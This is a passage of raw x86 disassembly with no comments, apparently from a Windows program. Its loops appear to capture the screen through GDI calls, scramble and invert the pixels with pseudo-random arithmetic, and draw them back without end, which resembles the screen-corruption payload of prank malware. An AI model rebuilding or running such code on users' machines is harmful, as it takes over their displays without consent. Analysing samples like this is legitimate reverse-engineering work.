  40341c:	89 c1                	mov    %eax,%ecx
  40341e:	ba ab aa aa 2a       	mov    $0x2aaaaaab,%edx
  403423:	89 c8                	mov    %ecx,%eax
  403425:	f7 ea                	imul   %edx
  403427:	c1 fa 02             	sar    $0x2,%edx
  40342a:	89 c8                	mov    %ecx,%eax
  40342c:	c1 f8 1f             	sar    $0x1f,%eax
  40342f:	29 c2                	sub    %eax,%edx
  403431:	89 d0                	mov    %edx,%eax
  403433:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403436:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403439:	89 d0                	mov    %edx,%eax
  40343b:	01 c0                	add    %eax,%eax
  40343d:	01 d0                	add    %edx,%eax
  40343f:	c1 e0 03             	shl    $0x3,%eax
  403442:	29 c1                	sub    %eax,%ecx
  403444:	89 c8                	mov    %ecx,%eax
  403446:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403449:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40344c:	c1 e0 02             	shl    $0x2,%eax
  40344f:	89 c2                	mov    %eax,%edx
  403451:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403454:	01 c2                	add    %eax,%edx
  403456:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403459:	01 d0                	add    %edx,%eax
  40345b:	0f b6 10             	movzbl (%eax),%edx
  40345e:	8b 45 c8             	mov    -0x38(%ebp),%eax
  403461:	89 c1                	mov    %eax,%ecx
  403463:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  403466:	31 c8                	xor    %ecx,%eax
  403468:	89 c3                	mov    %eax,%ebx
  40346a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40346d:	c1 e0 02             	shl    $0x2,%eax
  403470:	89 c1                	mov    %eax,%ecx
  403472:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403475:	01 c1                	add    %eax,%ecx
  403477:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40347a:	01 c8                	add    %ecx,%eax
  40347c:	01 da                	add    %ebx,%edx
  40347e:	88 10                	mov    %dl,(%eax)
  403480:	83 45 ec 01          	addl   $0x1,-0x14(%ebp)
  403484:	e9 26 ff ff ff       	jmp    0x4033af
  403489:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40348c:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  403490:	c1 e0 02             	shl    $0x2,%eax
  403493:	89 c2                	mov    %eax,%edx
  403495:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403498:	89 44 24 08          	mov    %eax,0x8(%esp)
  40349c:	89 54 24 04          	mov    %edx,0x4(%esp)
  4034a0:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4034a3:	89 04 24             	mov    %eax,(%esp)
  4034a6:	a1 00 a2 40 00       	mov    0x40a200,%eax
  4034ab:	ff d0                	call   *%eax
  4034ad:	83 ec 0c             	sub    $0xc,%esp
  4034b0:	c7 44 24 20 08 00 33 	movl   $0x330008,0x20(%esp)
  4034b7:	00 
  4034b8:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  4034bf:	00 
  4034c0:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4034c7:	00 
  4034c8:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4034cb:	89 44 24 14          	mov    %eax,0x14(%esp)
  4034cf:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4034d2:	89 44 24 10          	mov    %eax,0x10(%esp)
  4034d6:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4034d9:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4034dd:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4034e4:	00 
  4034e5:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4034ec:	00 
  4034ed:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4034f0:	89 04 24             	mov    %eax,(%esp)
  4034f3:	a1 d8 a1 40 00       	mov    0x40a1d8,%eax
  4034f8:	ff d0                	call   *%eax
  4034fa:	83 ec 24             	sub    $0x24,%esp
  4034fd:	8b 45 d0             	mov    -0x30(%ebp),%eax
  403500:	89 04 24             	mov    %eax,(%esp)
  403503:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  403508:	ff d0                	call   *%eax
  40350a:	83 ec 04             	sub    $0x4,%esp
  40350d:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403510:	89 04 24             	mov    %eax,(%esp)
  403513:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  403518:	ff d0                	call   *%eax
  40351a:	83 ec 04             	sub    $0x4,%esp
  40351d:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403520:	89 04 24             	mov    %eax,(%esp)
  403523:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  403528:	ff d0                	call   *%eax
  40352a:	83 ec 04             	sub    $0x4,%esp
  40352d:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  403531:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403534:	ba 56 55 55 55       	mov    $0x55555556,%edx
  403539:	89 c8                	mov    %ecx,%eax
  40353b:	f7 ea                	imul   %edx
  40353d:	89 c8                	mov    %ecx,%eax
  40353f:	c1 f8 1f             	sar    $0x1f,%eax
  403542:	29 c2                	sub    %eax,%edx
  403544:	89 d0                	mov    %edx,%eax
  403546:	01 c0                	add    %eax,%eax
  403548:	01 d0                	add    %edx,%eax
  40354a:	29 c1                	sub    %eax,%ecx
  40354c:	89 c8                	mov    %ecx,%eax
  40354e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403551:	e9 1b fd ff ff       	jmp    0x403271
  403556:	55                   	push   %ebp
  403557:	89 e5                	mov    %esp,%ebp
  403559:	53                   	push   %ebx
  40355a:	83 ec 74             	sub    $0x74,%esp
  40355d:	a1 3c a2 40 00       	mov    0x40a23c,%eax
  403562:	ff d0                	call   *%eax
  403564:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403567:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40356e:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  403573:	ff d0                	call   *%eax
  403575:	83 ec 04             	sub    $0x4,%esp
  403578:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40357b:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  403582:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  403587:	ff d0                	call   *%eax
  403589:	83 ec 04             	sub    $0x4,%esp
  40358c:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40358f:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403592:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  403596:	89 c2                	mov    %eax,%edx
  403598:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40359b:	01 d0                	add    %edx,%eax
  40359d:	c1 e0 02             	shl    $0x2,%eax
  4035a0:	c7 44 24 0c 04 00 00 	movl   $0x4,0xc(%esp)
  4035a7:	00 
  4035a8:	c7 44 24 08 00 30 00 	movl   $0x3000,0x8(%esp)
  4035af:	00 
  4035b0:	89 44 24 04          	mov    %eax,0x4(%esp)
  4035b4:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4035bb:	a1 64 a2 40 00       	mov    0x40a264,%eax
  4035c0:	ff d0                	call   *%eax
  4035c2:	83 ec 10             	sub    $0x10,%esp
  4035c5:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4035c8:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4035cf:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4035d6:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  4035db:	ff d0                	call   *%eax
  4035dd:	83 ec 04             	sub    $0x4,%esp
  4035e0:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4035e3:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4035e6:	89 04 24             	mov    %eax,(%esp)
  4035e9:	a1 e0 a1 40 00       	mov    0x40a1e0,%eax
  4035ee:	ff d0                	call   *%eax
  4035f0:	83 ec 04             	sub    $0x4,%esp
  4035f3:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4035f6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4035f9:	89 44 24 10          	mov    %eax,0x10(%esp)
  4035fd:	c7 44 24 0c 20 00 00 	movl   $0x20,0xc(%esp)
  403604:	00 
  403605:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  40360c:	00 
  40360d:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403610:	89 44 24 04          	mov    %eax,0x4(%esp)
  403614:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403617:	89 04 24             	mov    %eax,(%esp)
  40361a:	a1 dc a1 40 00       	mov    0x40a1dc,%eax
  40361f:	ff d0                	call   *%eax
  403621:	83 ec 14             	sub    $0x14,%esp
  403624:	89 45 d0             	mov    %eax,-0x30(%ebp)
  403627:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40362a:	89 44 24 04          	mov    %eax,0x4(%esp)
  40362e:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403631:	89 04 24             	mov    %eax,(%esp)
  403634:	a1 fc a1 40 00       	mov    0x40a1fc,%eax
  403639:	ff d0                	call   *%eax
  40363b:	83 ec 08             	sub    $0x8,%esp
  40363e:	c7 44 24 20 20 00 cc 	movl   $0xcc0020,0x20(%esp)
  403645:	00 
  403646:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  40364d:	00 
  40364e:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  403655:	00 
  403656:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403659:	89 44 24 14          	mov    %eax,0x14(%esp)
  40365d:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403660:	89 44 24 10          	mov    %eax,0x10(%esp)
  403664:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403667:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40366b:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  403672:	00 
  403673:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40367a:	00 
  40367b:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40367e:	89 04 24             	mov    %eax,(%esp)
  403681:	a1 d8 a1 40 00       	mov    0x40a1d8,%eax
  403686:	ff d0                	call   *%eax
  403688:	83 ec 24             	sub    $0x24,%esp
  40368b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40368e:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  403692:	8d 14 85 00 00 00 00 	lea    0x0(,%eax,4),%edx
  403699:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40369c:	89 44 24 08          	mov    %eax,0x8(%esp)
  4036a0:	89 54 24 04          	mov    %edx,0x4(%esp)
  4036a4:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4036a7:	89 04 24             	mov    %eax,(%esp)
  4036aa:	a1 f4 a1 40 00       	mov    0x40a1f4,%eax
  4036af:	ff d0                	call   *%eax
  4036b1:	83 ec 0c             	sub    $0xc,%esp
  4036b4:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4036bb:	c6 45 cf 00          	movb   $0x0,-0x31(%ebp)
  4036bf:	a1 3c a2 40 00       	mov    0x40a23c,%eax
  4036c4:	ff d0                	call   *%eax
  4036c6:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4036c9:	29 d0                	sub    %edx,%eax
  4036cb:	3d 60 ea 00 00       	cmp    $0xea60,%eax
  4036d0:	0f 97 c0             	seta   %al
  4036d3:	84 c0                	test   %al,%al
  4036d5:	74 2f                	je     0x403706
  4036d7:	e8 5c 37 00 00       	call   0x406e38
  4036dc:	89 c1                	mov    %eax,%ecx
  4036de:	ba 81 80 80 80       	mov    $0x80808081,%edx
  4036e3:	89 c8                	mov    %ecx,%eax
  4036e5:	f7 ea                	imul   %edx
  4036e7:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  4036ea:	c1 f8 07             	sar    $0x7,%eax
  4036ed:	89 c2                	mov    %eax,%edx
  4036ef:	89 c8                	mov    %ecx,%eax
  4036f1:	c1 f8 1f             	sar    $0x1f,%eax
  4036f4:	29 c2                	sub    %eax,%edx
  4036f6:	89 d0                	mov    %edx,%eax
  4036f8:	89 c2                	mov    %eax,%edx
  4036fa:	c1 e2 08             	shl    $0x8,%edx
  4036fd:	29 c2                	sub    %eax,%edx
  4036ff:	89 c8                	mov    %ecx,%eax
  403701:	29 d0                	sub    %edx,%eax
  403703:	88 45 cf             	mov    %al,-0x31(%ebp)
  403706:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  40370d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403710:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  403714:	39 45 ec             	cmp    %eax,-0x14(%ebp)
  403717:	0f 8d d1 00 00 00    	jge    0x4037ee
  40371d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403720:	99                   	cltd
  403721:	f7 7d e4             	idivl  -0x1c(%ebp)
  403724:	89 55 c8             	mov    %edx,-0x38(%ebp)
  403727:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40372a:	99                   	cltd
  40372b:	f7 7d e0             	idivl  -0x20(%ebp)
  40372e:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  403731:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403734:	99                   	cltd
  403735:	f7 7d e0             	idivl  -0x20(%ebp)
  403738:	89 d0                	mov    %edx,%eax
  40373a:	85 c0                	test   %eax,%eax
  40373c:	75 2e                	jne    0x40376c
  40373e:	e8 f5 36 00 00       	call   0x406e38
  403743:	89 c1                	mov    %eax,%ecx
  403745:	ba 1f 85 eb 51       	mov    $0x51eb851f,%edx
  40374a:	89 c8                	mov    %ecx,%eax
  40374c:	f7 ea                	imul   %edx
  40374e:	c1 fa 05             	sar    $0x5,%edx
  403751:	89 c8                	mov    %ecx,%eax
  403753:	c1 f8 1f             	sar    $0x1f,%eax
  403756:	29 c2                	sub    %eax,%edx
  403758:	89 d0                	mov    %edx,%eax
  40375a:	6b c0 64             	imul   $0x64,%eax,%eax
  40375d:	29 c1                	sub    %eax,%ecx
  40375f:	89 c8                	mov    %ecx,%eax
  403761:	85 c0                	test   %eax,%eax
  403763:	75 07                	jne    0x40376c
  403765:	b8 01 00 00 00       	mov    $0x1,%eax
  40376a:	eb 05                	jmp    0x403771
  40376c:	b8 00 00 00 00       	mov    $0x0,%eax
  403771:	84 c0                	test   %al,%al
  403773:	74 31                	je     0x4037a6
  403775:	e8 be 36 00 00       	call   0x406e38
  40377a:	89 c1                	mov    %eax,%ecx
  40377c:	ba 89 88 88 88       	mov    $0x88888889,%edx
  403781:	89 c8                	mov    %ecx,%eax
  403783:	f7 ea                	imul   %edx
  403785:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  403788:	c1 f8 04             	sar    $0x4,%eax
  40378b:	89 c2                	mov    %eax,%edx
  40378d:	89 c8                	mov    %ecx,%eax
  40378f:	c1 f8 1f             	sar    $0x1f,%eax
  403792:	29 c2                	sub    %eax,%edx
  403794:	89 d0                	mov    %edx,%eax
  403796:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403799:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40379c:	6b c0 1e             	imul   $0x1e,%eax,%eax
  40379f:	29 c1                	sub    %eax,%ecx
  4037a1:	89 c8                	mov    %ecx,%eax
  4037a3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4037a6:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4037a9:	c1 e0 02             	shl    $0x2,%eax
  4037ac:	89 c2                	mov    %eax,%edx
  4037ae:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4037b1:	01 c2                	add    %eax,%edx
  4037b3:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4037b6:	01 d0                	add    %edx,%eax
  4037b8:	0f b6 18             	movzbl (%eax),%ebx
  4037bb:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4037be:	89 c1                	mov    %eax,%ecx
  4037c0:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4037c3:	89 c2                	mov    %eax,%edx
  4037c5:	89 c8                	mov    %ecx,%eax
  4037c7:	0f af c2             	imul   %edx,%eax
  4037ca:	89 c1                	mov    %eax,%ecx
  4037cc:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4037cf:	c1 e0 02             	shl    $0x2,%eax
  4037d2:	89 c2                	mov    %eax,%edx
  4037d4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4037d7:	01 c2                	add    %eax,%edx
  4037d9:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4037dc:	01 c2                	add    %eax,%edx
  4037de:	89 d8                	mov    %ebx,%eax
  4037e0:	0f af c1             	imul   %ecx,%eax
  4037e3:	88 02                	mov    %al,(%edx)
  4037e5:	83 45 ec 01          	addl   $0x1,-0x14(%ebp)
  4037e9:	e9 1f ff ff ff       	jmp    0x40370d
  4037ee:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4037f1:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  4037f5:	c1 e0 02             	shl    $0x2,%eax
  4037f8:	89 c2                	mov    %eax,%edx
  4037fa:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4037fd:	89 44 24 08          	mov    %eax,0x8(%esp)
  403801:	89 54 24 04          	mov    %edx,0x4(%esp)
  403805:	8b 45 d0             	mov    -0x30(%ebp),%eax
  403808:	89 04 24             	mov    %eax,(%esp)
  40380b:	a1 00 a2 40 00       	mov    0x40a200,%eax
  403810:	ff d0                	call   *%eax
  403812:	83 ec 0c             	sub    $0xc,%esp
  403815:	c7 44 24 20 08 00 33 	movl   $0x330008,0x20(%esp)
  40381c:	00 
  40381d:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  403824:	00 
  403825:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  40382c:	00 
  40382d:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403830:	89 44 24 14          	mov    %eax,0x14(%esp)
  403834:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403837:	89 44 24 10          	mov    %eax,0x10(%esp)
  40383b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40383e:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403842:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  403849:	00 
  40384a:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  403851:	00 
  403852:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403855:	89 04 24             	mov    %eax,(%esp)
  403858:	a1 d8 a1 40 00       	mov    0x40a1d8,%eax
  40385d:	ff d0                	call   *%eax
  40385f:	83 ec 24             	sub    $0x24,%esp
  403862:	8b 45 d0             	mov    -0x30(%ebp),%eax
  403865:	89 04 24             	mov    %eax,(%esp)
  403868:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  40386d:	ff d0                	call   *%eax
  40386f:	83 ec 04             	sub    $0x4,%esp
  403872:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403875:	89 04 24             	mov    %eax,(%esp)
  403878:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  40387d:	ff d0                	call   *%eax
  40387f:	83 ec 04             	sub    $0x4,%esp
  403882:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403885:	89 04 24             	mov    %eax,(%esp)
  403888:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  40388d:	ff d0                	call   *%eax
  40388f:	83 ec 04             	sub    $0x4,%esp
  403892:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  403896:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403899:	ba 56 55 55 55       	mov    $0x55555556,%edx
  40389e:	89 c8                	mov    %ecx,%eax
  4038a0:	f7 ea                	imul   %edx
  4038a2:	89 c8                	mov    %ecx,%eax
  4038a4:	c1 f8 1f             	sar    $0x1f,%eax
  4038a7:	29 c2                	sub    %eax,%edx
  4038a9:	89 d0                	mov    %edx,%eax
  4038ab:	01 c0                	add    %eax,%eax
  4038ad:	01 d0                	add    %edx,%eax
  4038af:	29 c1                	sub    %eax,%ecx
  4038b1:	89 c8                	mov    %ecx,%eax
  4038b3:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4038b6:	e9 14 fd ff ff       	jmp    0x4035cf
  4038bb:	55                   	push   %ebp
  4038bc:	89 e5                	mov    %esp,%ebp
  4038be:	83 ec 68             	sub    $0x68,%esp
  4038c1:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4038c8:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  4038cd:	ff d0                	call   *%eax
  4038cf:	83 ec 04             	sub    $0x4,%esp
  4038d2:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4038d5:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4038dc:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  4038e1:	ff d0                	call   *%eax
  4038e3:	83 ec 04             	sub    $0x4,%esp
  4038e6:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4038e9:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  4038f0:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  4038f5:	ff d0                	call   *%eax
  4038f7:	83 ec 04             	sub    $0x4,%esp
  4038fa:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4038fd:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403900:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  403904:	89 c2                	mov    %eax,%edx
  403906:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403909:	01 d0                	add    %edx,%eax
  40390b:	c1 e0 02             	shl    $0x2,%eax
  40390e:	c7 44 24 0c 04 00 00 	movl   $0x4,0xc(%esp)
  403915:	00 
  403916:	c7 44 24 08 00 30 00 	movl   $0x3000,0x8(%esp)
  40391d:	00 
  40391e:	89 44 24 04          	mov    %eax,0x4(%esp)
  403922:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403929:	a1 64 a2 40 00       	mov    0x40a264,%eax
  40392e:	ff d0                	call   *%eax
  403930:	83 ec 10             	sub    $0x10,%esp
  403933:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403936:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403939:	89 04 24             	mov    %eax,(%esp)
  40393c:	a1 e0 a1 40 00       	mov    0x40a1e0,%eax
  403941:	ff d0                	call   *%eax
  403943:	83 ec 04             	sub    $0x4,%esp
  403946:	89 45 dc             	mov    %eax,-0x24(%ebp)
  403949:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40394c:	89 44 24 10          	mov    %eax,0x10(%esp)
  403950:	c7 44 24 0c 20 00 00 	movl   $0x20,0xc(%esp)
  403957:	00 
  403958:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  40395f:	00 
  403960:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403963:	89 44 24 04          	mov    %eax,0x4(%esp)
  403967:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40396a:	89 04 24             	mov    %eax,(%esp)
  40396d:	a1 dc a1 40 00       	mov    0x40a1dc,%eax
  403972:	ff d0                	call   *%eax
  403974:	83 ec 14             	sub    $0x14,%esp
  403977:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40397a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40397d:	89 44 24 04          	mov    %eax,0x4(%esp)
  403981:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403984:	89 04 24             	mov    %eax,(%esp)
  403987:	a1 fc a1 40 00       	mov    0x40a1fc,%eax
  40398c:	ff d0                	call   *%eax
  40398e:	83 ec 08             	sub    $0x8,%esp
  403991:	c7 44 24 20 20 00 cc 	movl   $0xcc0020,0x20(%esp)
  403998:	00 
  403999:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  4039a0:	00 
  4039a1:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4039a8:	00 
  4039a9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4039ac:	89 44 24 14          	mov    %eax,0x14(%esp)
  4039b0:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4039b3:	89 44 24 10          	mov    %eax,0x10(%esp)
  4039b7:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4039ba:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4039be:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4039c5:	00 
  4039c6:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4039cd:	00 
  4039ce:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4039d1:	89 04 24             	mov    %eax,(%esp)
  4039d4:	a1 d8 a1 40 00       	mov    0x40a1d8,%eax
  4039d9:	ff d0                	call   *%eax
  4039db:	83 ec 24             	sub    $0x24,%esp
  4039de:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4039e1:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  4039e5:	8d 14 85 00 00 00 00 	lea    0x0(,%eax,4),%edx
  4039ec:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4039ef:	89 44 24 08          	mov    %eax,0x8(%esp)
  4039f3:	89 54 24 04          	mov    %edx,0x4(%esp)
  4039f7:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4039fa:	89 04 24             	mov    %eax,(%esp)
  4039fd:	a1 f4 a1 40 00       	mov    0x40a1f4,%eax
  403a02:	ff d0                	call   *%eax
  403a04:	83 ec 0c             	sub    $0xc,%esp
  403a07:	e8 2c 34 00 00       	call   0x406e38
  403a0c:	89 c1                	mov    %eax,%ecx
  403a0e:	ba ab aa aa 2a       	mov    $0x2aaaaaab,%edx
  403a13:	89 c8                	mov    %ecx,%eax
  403a15:	f7 ea                	imul   %edx
  403a17:	89 c8                	mov    %ecx,%eax
  403a19:	c1 f8 1f             	sar    $0x1f,%eax
  403a1c:	29 c2                	sub    %eax,%edx
  403a1e:	89 d0                	mov    %edx,%eax
  403a20:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403a23:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  403a26:	89 d0                	mov    %edx,%eax
  403a28:	01 c0                	add    %eax,%eax
  403a2a:	01 d0                	add    %edx,%eax
  403a2c:	01 c0                	add    %eax,%eax
  403a2e:	29 c1                	sub    %eax,%ecx
  403a30:	89 c8                	mov    %ecx,%eax
  403a32:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403a35:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  403a3c:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
  403a40:	75 07                	jne    0x403a49
  403a42:	c7 45 f4 02 00 00 00 	movl   $0x2,-0xc(%ebp)
  403a49:	83 7d d4 01          	cmpl   $0x1,-0x2c(%ebp)
  403a4d:	75 07                	jne    0x403a56
  403a4f:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  403a56:	83 7d d4 03          	cmpl   $0x3,-0x2c(%ebp)
  403a5a:	75 07                	jne    0x403a63
  403a5c:	c7 45 f4 04 00 00 00 	movl   $0x4,-0xc(%ebp)
  403a63:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  403a6a:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403a6d:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  403a71:	39 45 f0             	cmp    %eax,-0x10(%ebp)
  403a74:	7d 1f                	jge    0x403a95
  403a76:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403a79:	8d 14 85 00 00 00 00 	lea    0x0(,%eax,4),%edx
  403a80:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403a83:	01 c2                	add    %eax,%edx
  403a85:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403a88:	01 d0                	add    %edx,%eax
  403a8a:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403a8d:	88 10                	mov    %dl,(%eax)
  403a8f:	83 45 f0 01          	addl   $0x1,-0x10(%ebp)
  403a93:	eb d5                	jmp    0x403a6a
  403a95:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403a98:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  403a9c:	c1 e0 02             	shl    $0x2,%eax
  403a9f:	89 c2                	mov    %eax,%edx
  403aa1:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403aa4:	89 44 24 08          	mov    %eax,0x8(%esp)
  403aa8:	89 54 24 04          	mov    %edx,0x4(%esp)
  403aac:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403aaf:	89 04 24             	mov    %eax,(%esp)
  403ab2:	a1 00 a2 40 00       	mov    0x40a200,%eax
  403ab7:	ff d0                	call   *%eax
  403ab9:	83 ec 0c             	sub    $0xc,%esp
  403abc:	c7 44 24 20 08 00 33 	movl   $0x330008,0x20(%esp)
  403ac3:	00 
  403ac4:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  403acb:	00 
  403acc:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  403ad3:	00 
  403ad4:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403ad7:	89 44 24 14          	mov    %eax,0x14(%esp)
  403adb:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403ade:	89 44 24 10          	mov    %eax,0x10(%esp)
  403ae2:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403ae5:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403ae9:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  403af0:	00 
